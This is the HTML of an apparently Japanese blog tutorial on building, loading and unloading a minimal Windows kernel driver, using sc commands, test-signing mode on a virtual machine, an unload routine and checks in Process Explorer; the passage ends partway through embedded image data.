&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; create 001_sample &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt;= kernel binPath= Z:\FirstDriverSample&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;成功すると次のような画面になり、レジストリの&lt;code class=&quot;language-text&quot;&gt;HKLM\SYSTEM\CurrentControlSet\Services&lt;/code&gt;配下に追加したサービスが登録されています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/817cd8b424ed771b6a711b20326e9a20/0b533/image-22.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAARlAAAEZQAGA43XUAAAB0UlEQVQ4y6WT227aMBzGzVFI3PCa3WWhWqXuMRBQngEhTm+wabftzS4mrQu0FMg5ThwnDShfbUOAbhdNN0u/+PT35892/uTHwyNWax2rjSkwYFo2TNOC7XhwPQrHFTUNBD4c2xFjvupTAfMDBJQqvEMs8cTH1h/w/LzE0+JRiJlYLpciwFNtxhg45+BhuK8FcRz/xXa7xW63A+FxAk7nMA0dtu1DFrk4TVPhguIjRa4hjMdgrgbLMvH123f0bm/R7/fR6/UUWbvb7R7pdDpHZL/dbkPTNCVKQh4hcH7D9yk+X1+DEIJ6vY5yuYxKpaJqOfYek8lkL8gPgowFuLn5okQajQZqtRpKpZJCimYb/Em1WlWCs9ns5JBav8SlJmi1rtSkDMzj6pzpdHoSdI2f4vVCNJstNVksFnMLFQqFt4Is5OpRkiTG5WVTTcpj/rNgKP4reeQ45keH8r5kYB6y05zd4d5hFHFcXHz68N1ljMfjg6A8sqdB1ze4u7vHYDBQk6PRKDfD4RDr9frkMPKfYBgb/G9RmSLzMPTmIu0svLwkKh+zvMyLjJdiyqEU5P5CWF6Jl94ed8oCkOa1t6+I4zqgzgKLuXyY6K1gehb8Hoe4V6zTlknLrnNnAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/817cd8b424ed771b6a711b20326e9a20/8ac56/image-22.webp 240w,
/static/817cd8b424ed771b6a711b20326e9a20/d3be9/image-22.webp 480w,
/static/817cd8b424ed771b6a711b20326e9a20/b0a15/image-22.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/817cd8b424ed771b6a711b20326e9a20/8ff5a/image-22.png 240w,
/static/817cd8b424ed771b6a711b20326e9a20/e85cb/image-22.png 480w,
/static/817cd8b424ed771b6a711b20326e9a20/0b533/image-22.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/817cd8b424ed771b6a711b20326e9a20/0b533/image-22.png&quot;
            alt=&quot;image-22.png&quot;
            title=&quot;image-22.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次に、追加したサービスを起動します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sc start 001_sample&lt;/code&gt;コマンドを実行すると、起動に失敗します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt; 001_sample
&lt;span class=&quot;token namespace&quot;&gt;[SC]&lt;/span&gt; StartService FAILED 1275:
このドライバーの読み込みはブロックされています&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これは、64bitのシステムドライバには署名が必要なのに対して、自分で作成したドライバには署名が付与されていないためです。&lt;/p&gt;
&lt;p&gt;このエラーを回避するため、ドライバを検証する仮想マシンをテスト署名モードで起動します。&lt;/p&gt;
&lt;p&gt;以下のコマンドを実行し、再起動すればOKです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;bcdedit &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt; testsigning on&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;※ OSを再起動するまで、テスト署名モードには移行しません。&lt;/p&gt;
&lt;p&gt;※ セキュアブート環境の場合、テスト署名モードへの移行に失敗します。&lt;/p&gt;
&lt;p&gt;再起動には、管理者権限で起動したコマンドプロンプトで以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;shutdown &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;r &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;t 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再起動後、再びサービス起動を実行すると、登録したサービスが起動しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt; 001_sample
SERVICE_NAME: sample
        &lt;span class=&quot;token function&quot;&gt;TYPE&lt;/span&gt;               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;STOPPABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; NOT_PAUSABLE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IGNORES_SHUTDOWN&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        WIN32_EXIT_CODE    : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        SERVICE_EXIT_CODE  : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次はサービスの停止を実行します。&lt;/p&gt;
&lt;h3 id=&quot;サービスの停止ができない問題&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E5%81%9C%E6%AD%A2%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E5%95%8F%E9%A1%8C&quot; aria-label=&quot;サービスの停止ができない問題 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サービスの停止ができない問題&lt;/h3&gt;
&lt;p&gt;ここまでのドライバモジュールでサービスの停止を実行しようとしても、停止に失敗します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; stop 001_sample
&lt;span class=&quot;token namespace&quot;&gt;[SC]&lt;/span&gt; ControlService FAILED 1052:s
要求された制御はこのサービスに対して無効です。&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、ProcessHackerなどのツールを利用してサービスの停止を実行しても同様になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c18158a0b8a4ca06a2913b1f95005dbb/2bef9/image-62-1024x756.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACN0lEQVQ4y31UibKiMBDk/39vtZ6CgCI3yH2K2K8niKuutamaIoFJz9E9aHESoW1b1HVNazAMA263m7J5njHxeb/f8brkvJr4jeOI6/WKoiyh/ex+EHgubMuGYRyQpimyS4YwDBFFMZIkwSWJkeU56qpGyUsSvOs6ZVVVIYkT5Pzu+QG0zeYPL6UKYL/f8xkhjmMEQUDAiM4xLMuCruvqXVEU6PteZScViK0VSHDNsk3WAOXkMVOJNk0TekZvmqUFASOHYUCfAd/WCijBNJ1ZSeoCeDgcVBayF1tL830fruuq8j57uNoCyB7q+l41tetaOCcHRV6gI0lNXSmAllm65zNOpyP7VyyALPOToGeGe8NQDEkmlmnhzMt+lCDKS5RVg7YbkF5yxOkFddvhOs3ox0ntIWCfJVtkV/qkANl81/ORkd3+sEPbL+8bybhpKa+lr1JRw0DzI9M3QIPsSbNFiwklI0vk0VGf4zjwW6cIEuCRgWsCe0mBOKueQO+kUHsqQwIe7aPSU8lLYZrBMG04roejc4Z1PPFswT772Jou/CT/3sOdbpKIXGVgsJ/CqOyFYds+KY16nkdSHEQPSf3N7AugyagC0LaNIkUui0Tko1hD4EBkQ7K+yebfHpomqpIS4Ug5joM8y5+6FEGX1FbE6VmE3VMRo2rRK/A8v5ZMYTePn4Jt22pSREYTLWW5wqoAi5xk/78lc65ttxvl7LHMdVJklmW2JaI4xdFyznlulYSaN1snSnx+Ae3/e/VyADnqAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/c18158a0b8a4ca06a2913b1f95005dbb/8ac56/image-62-1024x756.webp 240w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/d3be9/image-62-1024x756.webp 480w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/e46b2/image-62-1024x756.webp 960w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/a9a89/image-62-1024x756.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/c18158a0b8a4ca06a2913b1f95005dbb/8ff5a/image-62-1024x756.png 240w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/e85cb/image-62-1024x756.png 480w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/d9199/image-62-1024x756.png 960w,
/static/c18158a0b8a4ca06a2913b1f95005dbb/2bef9/image-62-1024x756.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/c18158a0b8a4ca06a2913b1f95005dbb/d9199/image-62-1024x756.png&quot;
            alt=&quot;image-62-1024x756.png&quot;
            title=&quot;image-62-1024x756.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これは、前述したアンロードルーチンをデバイスドライバに実装していないことに起因します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://proc-cpuinfo.fixstars.com/2017/06/windows-device-driver-1/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsデバイスドライバの基本動作を確認する (1) - Fixstars Tech Blog /proc/cpuinfo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため、コードを以下のように修正しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;ntddk.h&amp;gt;

void FirstDriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
}

extern &amp;quot;C&amp;quot;
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

    // アンロードルーチンを定義
	DriverObject-&amp;gt;DriverUnload = FirstDriverUnload;

	return STATUS_SUCCESS;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでデバイスドライバを再読み込みし、サービスを起動した後に&lt;code class=&quot;language-text&quot;&gt;sc stop 001_sample&lt;/code&gt;コマンドを実行すると、サービスが停止できるようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; &lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; stop 001_sample
SERVICE_NAME: 001_sample
        &lt;span class=&quot;token function&quot;&gt;TYPE&lt;/span&gt;               : 1  KERNEL_DRIVER
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        SERVICE_EXIT_CODE  : 0  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        CHECKPOINT         : 0x0
        WAIT_HINT          続いて、サービスの確認を行います。&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;サービスを再読み込みする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%82%92%E5%86%8D%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF%E3%81%99%E3%82%8B&quot; aria-label=&quot;サービスを再読み込みする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サービスを再読み込みする&lt;/h3&gt;
&lt;p&gt;サービスの再読み込みのためには、一度登録していたサービスを削除する必要があります。&lt;/p&gt;
&lt;p&gt;以下のコマンドでサービスの削除と再登録が可能なので、これを&lt;code class=&quot;language-text&quot;&gt;reload.bat&lt;/code&gt;などの適当なバッチファイルとして保存して使用していきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; stop 001_sample
&lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; delete 001_sample
&lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; create 001_sample &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt;= kernel binPath= Z:\FirstDriverSample&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
&lt;span class=&quot;token function&quot;&gt;sc&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt; 001_sample&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次は登録されたカーネルドライバのサービスを確認します。&lt;/p&gt;
&lt;h3 id=&quot;サービスの確認&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E7%A2%BA%E8%AA%8D&quot; aria-label=&quot;サービスの確認 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;サービスの確認&lt;/h3&gt;
&lt;p&gt;そもそもサービスとは、という話を簡単に触れておきます。&lt;/p&gt;
&lt;p&gt;Windowsにおけるサービスは、サービスコントロールマネージャー（SCM）によって開始されるプロセスを指します。&lt;/p&gt;
&lt;p&gt;カーネルドライバを追加した場合、サービスとして追加されるのでややこしいですが、多くの場合「Windowsサービス」と「ドライバサービス」は区別されることが多いようです。&lt;/p&gt;
&lt;p&gt;インサイドWindowsでも、「サービス」とはSCMによって起動されるユーザモードプロセスであり、デバイスドライバはサービスとしては扱わないことが明示されています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3ei56Eg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;インサイドWindows 第7版 上&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows/win32/services/service-control-manager&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;サービス コントロール マネージャー - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;カーネルドライバは先ほど確認した通り&lt;code class=&quot;language-text&quot;&gt;HKLM\SYSTEM\CurrentCntrolSet\Services&lt;/code&gt;のサブキーとして登録され、SCMで起動されます。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;HKLM\SYSTEM\CurrentCntrolSet\Services&lt;/code&gt;に登録されたサービスはカーネルドライバとWindowsサービスとで区別されており、各サブキーの[Type]の値が小さな値のものはカーネルドライバであり、0x10もしくは0x20の値のものはWindowsサービスとして登録されていることを意味します。&lt;/p&gt;
&lt;p&gt;実際に登録されたカーネルドライバのサービスは、ProcessHackerやProexpなどのツールによって確認することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 835px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3ed7b1a1f81b29509725d9a3d2f23633/f0685/image-59.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 81.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACpUlEQVQ4y3VUaY+bMBTM//9pVT+1ym4uwEA4w2EgHAmQ6bzHRlpVrSXL4Jh5czxnl2Qx2qZBVZWwtkFZlOi6Ox6PBx7TA+M4YZomPJcVM9/xeuEFWbb177EzgY8sTZAmEYwfIEkS1FUNW1vUZYWyZKG6Rt20sMUNj3FkgW2O44C+73UOX+vucPxEGIZkWMPzXOz3e+R5rkBVXSGKYrgmQJbfcDhd4Pkhfv3eww+uSLkXXCM0VNQPouSB3flyQhCEmOcZeZbBGEPG2QZIhkGU4Ox4cD2DKE5RsHCS5ShKsqZFlswHAglo3d6xc7wz2rZV/VVVwfd9FgjQ8OC6LOiGUW24Xq9orIXxPBRFwb0YcRxr4dPxiGsUoawb7FzXQUDvNsASR/4oB2+3GxYCtveBzwWGYVAVEpLsy/vz+fzaGzXQYgO8IKVEBWQ1Ydjwx7bt1OjKtvSH5t/v+uHI51GDmTQES9YCXjG4orIENA5DuCmgJGvoVRiEKl8Am65HToYi+XQ6aUHxWT3mGbEnotxMgmTxXRhn+sPGkB6azcMkTZWBAIo/4p/rujrFkoa9q4w5U57NaZECysdptkmuSduQgVSUUKR5BTBlqtbWyvByuei5Oy0QUAlUnmuqUw8DAkiK75QljO9DQumHrYnXddU9CUXCkPU9J96s0koonq+N/A5Fmlxk6CDD9t5jWV/vV2X9rzETVCU77HiRrYC8x67j0kejkt8M50WYvbb7+48p40nGytAPYziOo7SF4eFw0AIZfZV3aZv1P6y+j5UqlKG0wFtyQf/E9CROtqSZZtV09GvRW7P5NfNj8eyJqh3Q9pP2oYSjoZyNpz3WdZ1eKcO2Kdh30rDipVyns8ve5J+EH0bbyj51wgQ/Pgx+fjj4PDn4OBwJaPEHXr3AFDq1+HQAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3ed7b1a1f81b29509725d9a3d2f23633/8ac56/image-59.webp 240w,
/static/3ed7b1a1f81b29509725d9a3d2f23633/d3be9/image-59.webp 480w,
/static/3ed7b1a1f81b29509725d9a3d2f23633/2321d/image-59.webp 835w&quot;
              sizes=&quot;(max-width: 835px) 100vw, 835px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3ed7b1a1f81b29509725d9a3d2f23633/8ff5a/image-59.png 240w,
/static/3ed7b1a1f81b29509725d9a3d2f23633/e85cb/image-59.png 480w,
/static/3ed7b1a1f81b29509725d9a3d2f23633/f0685/image-59.png 835w&quot;
            sizes=&quot;(max-width: 835px) 100vw, 835px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3ed7b1a1f81b29509725d9a3d2f23633/f0685/image-59.png&quot;
            alt=&quot;image-59.png&quot;
            title=&quot;image-59.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;続いて、ドライバ（.sysファイル）がシステムにロードされていることも確認してみます。&lt;/p&gt;
&lt;h3 id=&quot;ドライバがシステムに読み込まれていることを確認&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%8C%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AB%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D&quot; aria-label=&quot;ドライバがシステムに読み込まれていることを確認 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ドライバがシステムに読み込まれていることを確認&lt;/h3&gt;
&lt;p&gt;Proexpで、[Lower Pane View]から[DLLs]を開きます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 786px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/92071d128e5860eb218f94bc82b0ce0b/321ea/image-60.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 100.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAAES0lEQVQ4y1VUiW7bRhDVN7dA0KBAPyABCjRtgRQBEuRoDiRwkBaJ4zOOY8l2bImiqJMURYqieIgiJUqUZR3269s1GrQLPOxyZ/dx5s3s5KJBiJ7rom65sPoDhIGPMAy/YTAYYJKmGI1GGKcTjMepnC8XSyxXa6yIxXJFLLleIef7MeIoQBRHcFwP3W4XvV6PF8cSk8kEcRzLH6WRiyzsYpGNcJmNkcYB4tDFLI2RpQmSJEGu73vYqQQ4aCSwbAdmuw1dN+D7PrIsk4STdAS7H+EvJcKH6gT7xgL77aXErj7HgXWNSgg5cgndP6zY2K4OoNv00OrAIKlNT/t9j2EPMCNxPxxip2TjoOoTHg7rIU7NEY6aA+T1BN2xoLtGzgtjuHYHLSdCw7DhWCbcngPHtuB7fYyTmIRTJIMAQ0tH5jmYBT1kfg9Tr8u9FmZ+l2Qr0tFDIaTnBShoFmp2AMN20fWHCJIMfjKFF0/gDUY4bzu487mA307O8EtJxT2tiZ8LCu5+OsHdvIKtcHIT8pKEuFrhkK5vnLnYKOjYpKafzRk+tac4MDPsNUf4SI33TBdlaq4Qn3UTv77+gjuPt3Hn6T7+PjZvCNfrFbLZHB0mJPJd2GYbkxHDnIwxm47lvJhnsNoG7v/2B36/dx8PHzzBg/uP8OMPP+HW97dx67vb+PPJixvCq6srDIcJDL0Dy7JQUTUmxeRejJQZHrF0pkxKr+vi4P0nnOzkUf5Sgl5sQTks4uveMcqc035yQyg0dHse7FYbQRjAtm0EQShLJmVBi7K5mF/Ac/oofsijvl+EunWK2l4J1d1zKJvHqG6fIWkFWK1lYfus/BTDZETiHur1OpPky2IW8P2Ahe7A80PUWz1UajZ0M4BpRzA6IVptD22LLyy6wHQ6Ra7VamG9Xkt3RXjlcpmFrcvwhYedTgfn5+cwDB